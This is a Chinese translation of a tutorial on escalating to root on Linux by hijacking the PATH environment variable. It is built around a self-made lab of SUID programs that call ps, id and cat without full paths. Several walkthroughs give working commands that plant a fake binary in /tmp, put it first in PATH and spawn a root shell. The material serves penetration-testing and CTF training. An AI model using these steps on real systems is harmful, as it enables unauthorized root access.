> 原文链接: https://www.anquanke.com//post/id/146799 


# 利用 PATH 环境变量进行 Linux 提权


                                阅读量   
                                **244417**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">16</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：http://www.hackingarticles.in/
                                <br>原文地址：[http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t0184813c0b71f9956f.png)](https://p4.ssl.qhimg.com/t0184813c0b71f9956f.png)

在解决了几个OSCP挑战之后，我们决定写一篇用各种方法进行Linux提权的的文章，这可能会对读者在进行渗透测试项目时有所帮助。在本文中，我们将学习各种操纵$ PATH变量的方法来获取远程主机的root访问权限，以及在CTF挑战中通过生成$PATH漏洞导致提权的技术。如果你已经解决了CTF对Post Exploit的挑战，那么通过阅读这篇文章，你将会意识到导致提权的一些漏洞。

**让我们开始吧！！**



## 介绍

PATH是Linux和类Unix操作系统中的环境变量，它指定可执行程序的所有bin和sbin存储目录。当用户在终端上运行任何命令时，它会向shell发送请求以在PATH变量中搜索可执行文件来响应用户执行的命令。超级用户通常还可以使用/sbin和/usr/sbin以便于执行系统管理的命令。

可以简单的使用echo命令查看用户的PATH。

```
echo $PATH
```

/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

如果你注意到’.’在环境PATH变量中，它表示登录的用户可以从当前目录执行二进制文件/脚本，并且它可以成为攻击者升级为root权限的绝佳技术。这是因为管理员在编写程序时缺乏注意，没有指定程序的完整路径。



## 方法1

Ubuntu LAB SET_UP

目前，我们位于/home/raj目录，我们将在其中创建一个名为/script的新目录。现在在脚本目录下，我们将编写一个小型的c程序来调用系统二进制文件的函数。

```
pwd
mkdir script
cd /script
nano demo.c
```

[![](https://p1.ssl.qhimg.com/t01f98795825ff2ed59.png)](https://p1.ssl.qhimg.com/t01f98795825ff2ed59.png)

正如你可以在我们的demo.c文件中看到的，我们正在调用ps命令，它是系统二进制文件。

[![](https://p1.ssl.qhimg.com/t01c2bc30af8cab542e.png)](https://p1.ssl.qhimg.com/t01c2bc30af8cab542e.png)

然后使用gcc编译demo.c文件，并将编译文件提升到SUID权限。

```
ls
gcc demo.c -o shell
chmod u+s shell
ls -la shell
```

[![](https://p3.ssl.qhimg.com/t01965fc89ca7a43f17.png)](https://p3.ssl.qhimg.com/t01965fc89ca7a43f17.png)

### <a class="reference-link" name="%E6%B8%97%E9%80%8F%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84VM%E6%9C%BA%E5%99%A8"></a>渗透受害者的VM机器

首先，你需要登陆到目标系统，然后进入提权阶段。假设您通过ssh成功登录到受害者的机器。然后在find命令的帮助下不浪费时间的搜索具有SUID或4000权限的文件。

```
find / -perm -u=s -type f 2&gt;/dev/null
```

因此，借助上述命令，攻击者可以枚举任何可执行文件，这里我们还可以发现具有suid权限的/home/raj/script/shell。<br>[![](https://p5.ssl.qhimg.com/t019b053def58725831.png)](https://p5.ssl.qhimg.com/t019b053def58725831.png)

然后我们进入/home/raj/script并看到一个可执行文件”shell”。所以我们运行这个文件，在这里它看起来像文件shell试图运行ps，这是一个真正的在/bin中的文件可以查看进程状态。

```
ls
./shell
```

[![](https://p0.ssl.qhimg.com/t019cdb5cc18e215a03.png)](https://p0.ssl.qhimg.com/t019cdb5cc18e215a03.png)

### <a class="reference-link" name="echo%20%E5%91%BD%E4%BB%A4"></a>echo 命令

```
cd /tmp
echo "/bin/sh" &gt; ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell
whoami
```

[![](https://p4.ssl.qhimg.com/t01a0a62275a0649d25.png)](https://p4.ssl.qhimg.com/t01a0a62275a0649d25.png)

### <a class="reference-link" name="copy%20%E5%91%BD%E4%BB%A4"></a>copy 命令

```
cd /home/raj/script/
cp /bin/sh /tmp/ps
echo $PATH
export PATH=/tmp:$PATH
./shell
whoami
```

[![](https://p5.ssl.qhimg.com/t0191e9db321385e7b4.png)](https://p5.ssl.qhimg.com/t0191e9db321385e7b4.png)

### <a class="reference-link" name="Symlink%20%E5%91%BD%E4%BB%A4"></a>Symlink 命令

```
ln -s /bin/sh ps
export PATH=.:$PATH
./shell
id
whoami
```

注：symlink也称为符号链接，如果该目录具有完全权限，则它们将成功运行。在Ubuntu中，在符号链接的情况下，我们已将权限777授予/script目录。

因此，我们看到攻击者可以操纵环境变量PATH来进行提权并获得root访问权限

[![](https://p2.ssl.qhimg.com/t0196e3f6a697286004.png)](https://p2.ssl.qhimg.com/t0196e3f6a697286004.png)

## 

## 方法2

Ubuntu LAB SET_UP<br>
重复上述步骤配置您自己的实验环境，现在在脚本目录中，我们将编写一个小型的c程序来调用系统二进制文件的函数。

```
pwd
mkdir script
cd /script
nano demo.c
```

正如你可以在我们的demo.c文件中看到的，我们正在调用id命令，它是系统二进制文件。<br>[![](https://p5.ssl.qhimg.com/t01a8d921f638a7b1e6.png)](https://p5.ssl.qhimg.com/t01a8d921f638a7b1e6.png)

然后使用gcc编译demo.c文件，并将编译文件提升到SUID权限。

```
ls
gcc demo.c -o shell2
chmod u+s shell2
ls -la shell2
```

[![](https://p2.ssl.qhimg.com/t01db8391ced601bd1e.png)](https://p2.ssl.qhimg.com/t01db8391ced601bd1e.png)

### <a class="reference-link" name="%E6%B8%97%E9%80%8F%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84VM%E6%9C%BA%E5%99%A8"></a>渗透受害者的VM机器

同样，您需要登陆目标系统，然后进入提权阶段。假设您通过ssh成功登录到受害者的机器。然后在find命令的帮助下不浪费时间的搜索具有SUID或4000权限的文件。在这里，我们还可以发现具有suid权限的/home/raj/script/shell2。

```
find / -perm -u=s -type f 2&gt;/dev/null
```

然后我们进入/home/raj/script并看到一个可执行文件”shell2”。所以我们运行这个文件，它看起来像文件shell2试图运行id，这是一个真正的在/bin中的文件。

```
cd /home/raj/script
ls
./shell2
```

[![](https://p3.ssl.qhimg.com/t0164caf928cf2ead3c.png)](https://p3.ssl.qhimg.com/t0164caf928cf2ead3c.png)

### <a class="reference-link" name="echo%20%E5%91%BD%E4%BB%A4"></a>echo 命令

```
cd /tmp
echo "/bin/sh" &gt; id
chmod 777 id
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell2
whoami
```

[![](https://p3.ssl.qhimg.com/t0103346164ef88d325.png)](https://p3.ssl.qhimg.com/t0103346164ef88d325.png)

## 

## 方法3

Ubuntu LAB SET_UP<br>
重复上述步骤设置您自己的实验环境，您可以在我们的demo.c文件中观察我们正在调用cat命令从etc/passwd文件中读取内容。<br>[![](https://p0.ssl.qhimg.com/t01d2f07d28870ed23a.png)](https://p0.ssl.qhimg.com/t01d2f07d28870ed23a.png)

然后使用gcc编译demo.c文件，并将编译文件提升到SUID权限。

```
ls
gcc demo.c -o raj
chmod u+s raj
ls -la raj
```

[![](https://p3.ssl.qhimg.com/t017d079d4374b51604.png)](https://p3.ssl.qhimg.com/t017d079d4374b51604.png)

### <a class="reference-link" name="%E6%B8%97%E9%80%8F%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84VM%E6%9C%BA%E5%99%A8"></a>渗透受害者的VM机器

再次登陆受害者的系统，然后进入提权阶段并执行以下命令查看sudo用户列表。

```
find / -perm -u=s -type f 2&gt;/dev/null
```

在这里，我们还可以发现/home/raj/script/raj具有suid权限，然后我们进入/home/raj /script并看到一个可执行文件”raj”。所以当我们运行这个文件时，它会把etc/passwd文件作为结果。

```
cd /home/raj/script/
ls
./raj
```

[![](https://p0.ssl.qhimg.com/t01965a4081c0ad89af.png)](https://p0.ssl.qhimg.com/t01965a4081c0ad89af.png)

## 

### <a class="reference-link" name="Nano%20%E7%BC%96%E8%BE%91%E5%99%A8"></a>Nano 编辑器

```
cd /tmp
nano cat
```

现在在终端输入/bin/bash并保存。<br>[![](https://p0.ssl.qhimg.com/t013342c0e70fb13e33.png)](https://p0.ssl.qhimg.com/t013342c0e70fb13e33.png)

```
chmod 777 cat
ls -al cat
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./raj
whoami
```

[![](https://p0.ssl.qhimg.com/t01acb9042a1a1b4baf.png)](https://p0.ssl.qhimg.com/t01acb9042a1a1b4baf.png)

## 

## 方法4

Ubuntu LAB SET_UP<br>
重复上面的步骤来设置你自己的实验环境，你可以在我们的demo.c文件中看到我们正在调用cat命令来读取/home/raj中的msg.txt，但是/home/raj中没有这样的文件。<br>[![](https://p3.ssl.qhimg.com/t0178ce97b62f28593e.png)](https://p3.ssl.qhimg.com/t0178ce97b62f28593e.png)

然后使用gcc编译demo.c文件，并将编译文件提升到SUID权限

```
ls
gcc demo.c -o ignite
chmod u+s ignite
ls -la ignite
```

[![](https://p5.ssl.qhimg.com/t01ee36ed1cd058067b.png)](https://p5.ssl.qhimg.com/t01ee36ed1cd058067b.png)

### <a class="reference-link" name="%E6%B8%97%E9%80%8F%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84VM%E6%9C%BA%E5%99%A8"></a>渗透受害者的VM机器

再次登陆受害者的系统，然后进入提权阶段，并执行以下命令查看sudo用户列表。

```
find / -perm -u=s -type f 2&gt;/dev/null
```

在这里我们也可以发现/home/raj/script/ignite具有suid权限，然后我们进入/home/raj/script并看到一个可执行文件”ignite”。所以，当我们运行这个文件时，会产生一个”cat：/home/raj/msg.txt”的错误结果。

```
cd /home/raj/script
ls
./ignite
```

[![](https://p5.ssl.qhimg.com/t01137bbddd2619316d.png)](https://p5.ssl.qhimg.com/t01137bbddd2619316d.png)

### <a class="reference-link" name="Vi%E7%BC%96%E8%BE%91%E5%99%A8"></a>Vi编辑器

```
cd /tmp
vi cat
```

现在在终端输入/bin/bash并保存。<br>[![](https://p3.ssl.qhimg.com/t01f7918d8a1f5e8213.png)](https://p3.ssl.qhimg.com/t01f7918d8a1f5e8213.png)

```
chmod 777 cat
ls -al cat
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./ignite
whoami
```

[![](https://p0.ssl.qhimg.com/t011fd052be5e041fec.png)](https://p0.ssl.qhimg.com/t011fd052be5e041fec.png)<br>
作者： AArti Singh是黑客文章的研究人员和技术撰稿人 信息安全顾问社交媒体爱好者。 [在这里联系](https://www.linkedin.com/in/aarti-singh-353698114)
